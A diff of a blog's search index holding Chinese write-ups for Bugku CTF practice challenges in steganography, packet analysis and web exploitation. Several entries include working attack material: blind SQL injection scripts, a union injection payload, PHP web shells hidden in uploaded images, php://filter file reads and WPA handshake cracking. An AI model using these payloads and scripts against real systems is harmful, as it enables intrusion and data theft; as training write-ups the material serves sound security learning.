@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[WP-Bugku-杂项系列]]></title>
     <url>%2F2018%2F08%2F26%2FWriteup%2FWP-Bugku-%E6%9D%82%E9%A1%B9%E7%B3%BB%E5%88%97%2F</url>
-    <content type="text"><![CDATA[这是一张单纯的图片题目地址http://120.24.86.145:8002/misc/1.jpg 将图片保存下来，直接notpad++查看下，发现末尾有一串 Unicode解码后的到key{you are right} 隐写题目地址http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar 一个压缩包，里面是一张.png的图片 用各种工具查看也没什么发现， 后来知道是修改图片的宽高…… winhex打开后第一行是文件头，固定格式第二行的前四位是宽，后四位是高 winhex打开A4 改为 F4 修改成功 telnet题目地址http://120.24.86.145:8002/misc/telnet/1.zip wireshark打开，查看tcp数据流 得到flag{d316759c281bf925d600be698a4973d5} 眼见非实(ISCCCTF)题目地址http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip 下载得到一个名为 zip 的文件，根据文件名的提示，给它加 .zip 的后缀 果然成功打开，打开后发现 解压后发现文件错误，本着试一试的原则，后缀名改成 .zip结果还真能打开，压缩包里是查看文件，最终在 眼见非实.zip\眼见非实\word\document.xml 这个文件中找到flag flag{F1@g} 又一张图片，还单纯吗题目地址http://120.24.86.145:8002/misc/2.jpg 保存图片，直接扔 binwalk 里foremost 分离后直接得到flag的图片 猜题目地址http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png 题目提示flag是某人名字全拼 图片又是一张不全的照片直接百度识图，搜到原图 key{liuyifei} 宽带信息泄露题目地址http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin 上网搜索得知需要用 RouterPassView 这个软件打开 隐写2题目地址http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg 把这张傻子图扔到binwalk上foremost分开，有一个压缩包，里面有一个加密的压缩包和一张图片分析提示，三个数，一个国王，一个女神，一个骑士，又说斗地主……那不就….还是直接暴力破解吧 先做个字典000~999,写了个垃圾的py（但是能用啊）12345678910filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): with open(filename, "a") as file_obj: file_obj.write(str(x)) file_obj.write(str(y)) file_obj.write(str(z)) file_obj.write("\n")file_obj.close() 暴力破解，试了好多，终于找到一个速度快又好用的工具Advanced Archive Password Recovery密码871 拿到图片，notpad++打开得到f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 提交发先不正确！还要解密….base64解密 eTB1IEFyZSBhIGhAY2tlciE= 得到y0u Are a h@cker!最后输入flag{y0u Are a h@cker!} 多种方法解决题目地址http://120.24.86.145:8002/misc/3.zip 下载后打开两次会报错，然后就好了，不知道是题目的原因还是真出错了…. 得到一个打不开，后缀改成 .txt 打开是提示图片格式和一长串 base64那就base64转图片解密得到一张二维码 识别后得到KEY{dca57f966e4e4e31fd5b15417da63269} linux题目地址http://120.24.86.145:8002/misc/1.tar.gz 不知道这道题怎么出的，解压，直接notepad++查看文件搜索 key 就得到key{feb81d3834e2423c9903f4755464060b} 中国菜刀题目地址http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip 多点几次打开压缩包解压 wireshark打开caidao.pcapng查看tcp流发现有压缩包文件 扔到kali中binwalk 文件 -e得到一个文件，添加后缀.tar，打开得到key{8769fe393f2b998fa6a11afe2bfcd65e} 这么多数据包题目地址http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip]]></content>
+    <content type="text"><![CDATA[这是一张单纯的图片题目地址http://120.24.86.145:8002/misc/1.jpg 将图片保存下来，直接notpad++查看下，发现末尾有一串 Unicode解码后的到key{you are right} 隐写题目地址http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar 一个压缩包，里面是一张.png的图片 用各种工具查看也没什么发现， 后来知道是修改图片的宽高…… winhex打开后第一行是文件头，固定格式第二行的前四位是宽，后四位是高 winhex打开A4 改为 F4 修改成功 telnet题目地址http://120.24.86.145:8002/misc/telnet/1.zip wireshark打开，查看tcp数据流 得到flag{d316759c281bf925d600be698a4973d5} 眼见非实(ISCCCTF)题目地址http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip 下载得到一个名为 zip 的文件，根据文件名的提示，给它加 .zip 的后缀 果然成功打开，打开后发现 解压后发现文件错误，本着试一试的原则，后缀名改成 .zip结果还真能打开，压缩包里是查看文件，最终在 眼见非实.zip\眼见非实\word\document.xml 这个文件中找到flag flag{F1@g} 又一张图片，还单纯吗题目地址http://120.24.86.145:8002/misc/2.jpg 保存图片，直接扔 binwalk 里foremost 分离后直接得到flag的图片 猜题目地址http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png 题目提示flag是某人名字全拼 图片又是一张不全的照片直接百度识图，搜到原图 key{liuyifei} 宽带信息泄露题目地址http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin 上网搜索得知需要用 RouterPassView 这个软件打开 隐写2题目地址http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg 把这张傻子图扔到binwalk上foremost分开，有一个压缩包，里面有一个加密的压缩包和一张图片分析提示，三个数，一个国王，一个女神，一个骑士，又说斗地主……那不就….还是直接暴力破解吧 先做个字典000~999,写了个垃圾的py（但是能用啊）1234567filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): with open(filename, "a") as file_obj: file_obj.write(str(x)+str(y)+str(z)+'\n')file_obj.close() 暴力破解，试了好多，终于找到一个速度快又好用的工具Advanced Archive Password Recovery密码871 拿到图片，notpad++打开得到f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 提交发现不正确！还要解密….base64解密 eTB1IEFyZSBhIGhAY2tlciE= 得到y0u Are a h@cker!最后输入flag{y0u Are a h@cker!} 多种方法解决题目地址http://120.24.86.145:8002/misc/3.zip 下载后打开两次会报错，然后就好了，不知道是题目的原因还是真出错了…. 得到一个打不开，后缀改成 .txt 打开是提示图片格式和一长串 base64那就base64转图片解密得到一张二维码 识别后得到KEY{dca57f966e4e4e31fd5b15417da63269} linux题目地址http://120.24.86.145:8002/misc/1.tar.gz 不知道这道题怎么出的，解压，直接notepad++查看文件搜索 key 就得到key{feb81d3834e2423c9903f4755464060b} 中国菜刀题目地址http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip 多点几次打开压缩包解压 wireshark打开caidao.pcapng查看tcp流发现有压缩包文件 扔到kali中binwalk 文件 -e得到一个文件，添加后缀.tar，打开得到key{8769fe393f2b998fa6a11afe2bfcd65e} 这么多数据包题目地址http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip 这道题给的数据包非常多，上网找答案 发现有很多包，快速浏览后发现前面都是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描，再往后看到5542已经getshell，追踪TCP数据流，发现txt文件 base64 解码得到 CCTF{do_you_like_sniffer} 做个游戏(08067CTF)题目地址http://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar 打开后是一个小游戏， 那么Java反编译（推荐Java Decompiler） 找到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} 将RGFqaURhbGlfSmlud2FuQ2hpamk=进行base64解码得到DajiDali_JinwanChiji 想蹭网先解开密码题目地址http://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap 文件是.cap，扔到wireshark里看一下，基本上都是802.11协议的包，WiFi认证过程重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 aircrack-ng 进行破解先生成字典12345678filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): for n in range(10): with open(filename, "a") as file_obj: file_obj.write('1391040'+str(x)+str(y)+str(z)+str(n)+'\n')file_obj.close() aircrack-ng -w num.txt wifi.cap开始破解 Linux2题目地址：链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy 又是linux，以bugku一贯的niaoxing，搜索key然后……然后就找到了…. 妹子的陌陌题目地址http://120.24.86.145:8002/misc/momo.jpg 下载后是一张照片binwalk发现有压缩包，改后缀.zip打开有一个.txt文件，需要密码解压，图片上有喜欢我吗.五个字符，密码就是这个 解压后得到 解密第一个摩斯密码得到HTTP//ENCODE.CHAHUO.COM/构造成urlHTTP://ENCODE.CHAHUO.COM/ 在这个网站中选择AES解密U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= 得到momoj2j.png 访问http://c.bugku.com/momoj2j.png 得到二维码，扫描后得到flag，要是扫不出来就将图片反相做一下再扫 #]]></content>
       <categories>
         <category>WriteUp</category>
       </categories>
@@ -38,7 +38,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-PHP_encrypt_1(ISCCCTF)]]></title>
-    <url>%2F2018%2F08%2F21%2FWriteup%2FWP-Bugku-PHP-encrypt-1-ISCCCTF%2F</url>
+    <url>%2F2018%2F08%2F21%2FWriteup%2FWeb%2FWP-Bugku-PHP-encrypt-1-ISCCCTF%2F</url>
     <content type="text"><![CDATA[题目直接给出了加密源码123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 输出 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 这里直接给出解密的源码1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction decrypt($str) &#123; $mkey = "729623334f0aa2784a1599fd374c120d"; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) &#123; // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; &#125; $md_data = array(); for($i=0;$i&lt;$md_len;$i++) &#123; // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); &#125; $md_data_source = array(); $data1 = ""; $data2 = ""; foreach ($md_data as $key =&gt; $value) &#123; // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125; $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 &#125; print "data1 =&gt; ".$data1."&lt;br&gt;\n"; print "data2 =&gt; ".$data2."&lt;br&gt;\n";&#125;$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt; Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -51,7 +51,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-login2(SKCTF)]]></title>
-    <url>%2F2018%2F08%2F21%2FWriteup%2FWP-Bugku-login2-SKCTF%2F</url>
+    <url>%2F2018%2F08%2F21%2FWriteup%2FWeb%2FWP-Bugku-login2-SKCTF%2F</url>
     <content type="text"><![CDATA[题目地址http://118.89.219.210:49165/ 随便输入用户名，密码抓包测试，发现返回的爆里有一个tip base64解码后的到源码：123$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123; &#125; 题目提示了union 那么尝试注入1&#39; union select 1,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;--password 这里 5f4dcc3b5aa765d61d8327deb882cf99 是经过md5加密后的 password 登陆成功后跳转到了 http://118.89.219.210:49165/index.php]]></content>
       <categories>
         <category>WriteUp</category>
@@ -63,7 +63,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-INSERT INTO注入]]></title>
-    <url>%2F2018%2F08%2F19%2FWriteup%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
+    <url>%2F2018%2F08%2F19%2FWriteup%2FWeb%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; &#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 这是X_FORWARDED_FOR注入，但是过滤了,在,被过滤的情况下，无法使用if语句当然在mysql下除了if还有1select case when xxx then xxx else xxx end; 而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下111'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23 python 脚本12345678910111213141516171819import requestsimport string mystring = string.ascii_letters+string.digitsurl='http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1" #这里的&#123;&#125;对应的是后面所需要的formatflag = ''for i in range(1,35): for j in mystring: try: headers = &#123;'x-forwarded-for':data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print flag breakprint 'The final flag:'+flag 这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 得到 flag{cdbf14c9551d5be5612f7bb5d2867853}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -76,7 +76,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-各种绕过]]></title>
-    <url>%2F2018%2F08%2F18%2FWriteup%2FWP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%2F</url>
+    <url>%2F2018%2F08%2F18%2FWriteup%2FWeb%2FWP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web7/ 源码12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 分析后发现，只要使uname的sha1和值与passwd的sha1的值相等即可， 但是同时他们两个的值又不能相等 那么构造数组get传参：?uname[]=1&amp;id=margin同时post传参：passwd[]=2 得到 flag{HACK_45hhs_213sDD} 这个和之前的前女友有点像，都是利用数组]]></content>
       <categories>
         <category>WriteUp</category>
@@ -88,7 +88,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-文件上传2(湖湘杯)]]></title>
-    <url>%2F2018%2F08%2F18%2FWriteup%2FWP-Bugku-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-%E6%B9%96%E6%B9%98%E6%9D%AF%2F</url>
+    <url>%2F2018%2F08%2F18%2FWriteup%2FWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-%E6%B9%96%E6%B9%98%E6%9D%AF%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:9011/ 看大佬博客，直接构造的url，直接读取文件？？？？？？？ http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 然后base64解码 得到flag{e00f8931037cbdb25f6b1d82dfe5552f}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -101,7 +101,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-求getshell]]></title>
-    <url>%2F2018%2F08%2F17%2FWriteup%2FWP-Bugku-%E6%B1%82getshell%2F</url>
+    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-%E6%B1%82getshell%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web9/ 打开后发现 My name is margin,give me a image file not a php 上传一个php文件不让上传，那么BP抓包 经过测试，将 Content-Type: 后参数改大写，修改文件名后缀为 .php5 ，文件类型改为图片类型 image/jpg 可以获得flag 得到 KEY{bb35dc123820e}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -113,7 +113,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-文件包含2]]></title>
-    <url>%2F2018%2F08%2F17%2FWriteup%2FWP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2%2F</url>
+    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2%2F</url>
     <content type="text"><![CDATA[题目地址http://118.89.219.210:49166/ 进入题目后发现这个页面，什么都没有 查看源代码 第一行发现1&lt;!-- upload.php --&gt; 访问 http://118.89.219.210:49166/index.php?file=upload.php 出现上传页面 - CASE 01 这种方法是直接利用命令system(&quot;ls&quot;);来查看目录找到flag 只能上传图片，对大小有限制，那么上传个图片马 1&lt;?php system("ls"); ?&gt; 上传后提示： 那么就访问upload/201808170638381043.jpg构造urlhttp://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg 发现后台把&lt;?php,?&gt;替换成了_,_ 那么用&lt;script&gt;标签绕过123&lt;script langulage=php&gt;system("ls");&lt;/script&gt; 再次上传，并打开文件所在地址 发现解析成功 页面出现如下内容 直接访问 this_is_th3_F14g_154f65sd4g35f4d6f43.txt 构造url:http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt 得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun} - CASE 02 这种方法是上传木马后利用中国菜刀 有了上一次的经验，这里直接：文件名 1.php;.jpg内容：1234&lt;script language=php&gt;echo 'aaaa';eval($_POST['aaaa']);&lt;/script&gt; 上传后访问http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg 发现成功显示了 aaaa 那么上菜刀 连接成功后 打开tx文件得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -127,7 +127,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-login3(SKCTF)]]></title>
-    <url>%2F2018%2F08%2F17%2FWriteup%2FWP-Bugku-login3-SKCTF%2F</url>
+    <url>%2F2018%2F08%2F17%2FWriteup%2FWeb%2FWP-Bugku-login3-SKCTF%2F</url>
     <content type="text"><![CDATA[题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯： username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。 毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。 我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是： select password,username from users where username=”我们输入的使用者名称” 如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成 where username=’admin’ and (substring(database(),1,1)=’a’) 如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。 但是这道题过滤了and！ ！ ！ 尝试加上and返回：经过尝试发现还过滤了空格，逗号，等号，for 空格用括号代替，等号用&lt;&gt;(一种不等号)代替 那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则： 1^1=0 1^0=1 0^0=0 就是说只有两个不同的布林值运算结果为1，其他为零 不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。 首先说下这里我们要补上两个布林值，这个最后再说为什么。 先猜资料库名，基本语句 admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^0# 解释一下为什么，为了绕过空格过滤，用括号隔开，过滤了等号，用不等号&lt;&gt;代替，只要是布林值就可以。 mid()函式和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？ 这里用到了ascii()取ascii码值的函式，如果传入一个字串那么就会取第一个字元的字元的ascii码值，这就有了for的作用，并且mid()函式是可以只写from的表示从第几位往后的字串，我们将取出的字串在传入ascii()中取第一位，就完成了对单个字元的提取。 每个字元的ascii码判断是不是不等于给定的数字，会得到一个布林值(0或1)再与结尾的0进行运算。 如果资料库名的第一位的ascii码值不是97，where条件是username=’admin’^1^0 返回值是username does not exist! 如果资料库名的第一位的ascii码值是97，where条件是username=’admin’^0^0 返回值会是password error! 这就构成了布林报错注入。 有人可能疑问大部分的判断都是无用的，就是说可能从97尝试到120都是username does not exist!，那如何快速找到语句成立时的返回结果(password error!)。 这里就是最后^0的妙用了， 因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。 补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。 就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error! 资料库名最后可以得到是：blindsql 下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。 没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下 admin’^(select(1)from(admin))^1# 返回password error!说明猜对了 猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。 为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。 然后猜password的值，暴力猜解，与猜资料库类似： admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0# 得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag 1import requests str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/=" url="http://118.89.219.210:49167/index.php" r=requests.session() def databasere(): resutlt="" for i in range(30): fla = 0 for j in str_all: playlod="admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j print(resutlt) if fla == 0: break def password(): resutlt="" for i in range(40): fla=0 for j in str_all: playlod = "admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i 1),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j fla=1 print('**************************',resutlt) if fla==0: break #databasere() password()]]></content>
       <categories>
         <category>WriteUp</category>
@@ -140,7 +140,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-细心]]></title>
-    <url>%2F2018%2F08%2F16%2FWriteup%2FWP-Bugku-%E7%BB%86%E5%BF%83%2F</url>
+    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-%E7%BB%86%E5%BF%83%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web13/ 进入后发现是一个404错误页面 参考大佬WP，查看robots.txt 发现有：User-agent: *Disallow: /resusl.php 访问/resusl.php后看到if ($_GET[x]==$password) 此处省略1w字 那么就要GET传参， （看大佬WP传了admin，可能是题目和管理员有关吧…..） 构造payload?x=admin 得到flag(ctf_0098_lkji-s)]]></content>
       <categories>
         <category>WriteUp</category>
@@ -152,7 +152,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-web8]]></title>
-    <url>%2F2018%2F08%2F16%2FWriteup%2FWP-Bugku-web8%2F</url>
+    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-web8%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web8/ 打开后有源码，代码审计123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 可以看出得到flag的途径是ac的值不为空，并且f的值从文件fn中获取，并且ac的值要恒等于f的值 构造payload?ac=flags&amp;fn=flag.txt 得到This is flag: flag{3cfb7a90fc0de31}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -165,7 +165,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-程序员本地网站]]></title>
-    <url>%2F2018%2F08%2F16%2FWriteup%2FWP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99%2F</url>
+    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/localhost/ 进入后提示从本地访问 那么BP抓包 加上这一行：X-Forwarded-For: 127.0.0.1 X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 得到flag{loc-al-h-o-st1}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -177,7 +177,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-flag.php]]></title>
-    <url>%2F2018%2F08%2F16%2FWriteup%2FWP-Bugku-flag.php%2F</url>
+    <url>%2F2018%2F08%2F16%2FWriteup%2FWeb%2FWP-Bugku-flag.php%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/flagphp/ 进入题目后看到的是登录框，题目提示“点了login咋没反应，提示：hint” 参考网上的WP， GET传参，构造后的url：http://120.24.86.145:8002/flagphp/?hint 就得到源码了：1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 意思是当得到 unserialize (反序列化)后的$cookie这个ISecer全等于$KEY后显示 flag这里要注意，$KEY的值并不是$KEY=&#39;ISecer:www.isecer.com&#39;;所显示的，而是&quot;&quot;，即空 那么php脚本一行：123&lt;?php print_r(serialize("")); ?&gt; 得到结果：s:0:&quot;&quot;; BP抓包Go一下：得到flag{unserialize_by_virink}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -192,7 +192,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-Cookies欺骗]]></title>
-    <url>%2F2018%2F08%2F14%2FWriteup%2FWP-Bugku-Cookies%E6%AC%BA%E9%AA%97%2F</url>
+    <url>%2F2018%2F08%2F14%2FWriteup%2FWeb%2FWP-Bugku-Cookies%E6%AC%BA%E9%AA%97%2F</url>
     <content type="text"><![CDATA[关于python requests.Session() 首先看到url上有base64编码解码后是 keys.txt url参数line是按行返回参考网上的脚本：12345678import requestss=requests.Session()url='http://120.24.86.145:8002/web11/index.php'for i in range(1,20): payload=&#123;'line':str(i),'filename':'aW5kZXgucGhw'&#125; a=s.get(url,params=payload).content content=str(a,encoding="utf-8") print(content) 得到源码：1234567891011121314151617181920212223242526272829303132333435error_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; bp抓包构造包：构造Cookie: margin=margin注意 filename 后的参数 keys.txt 要经过 base64 编码 得到：KEY{key_keys}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -217,7 +217,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-这是一个神奇的登陆框]]></title>
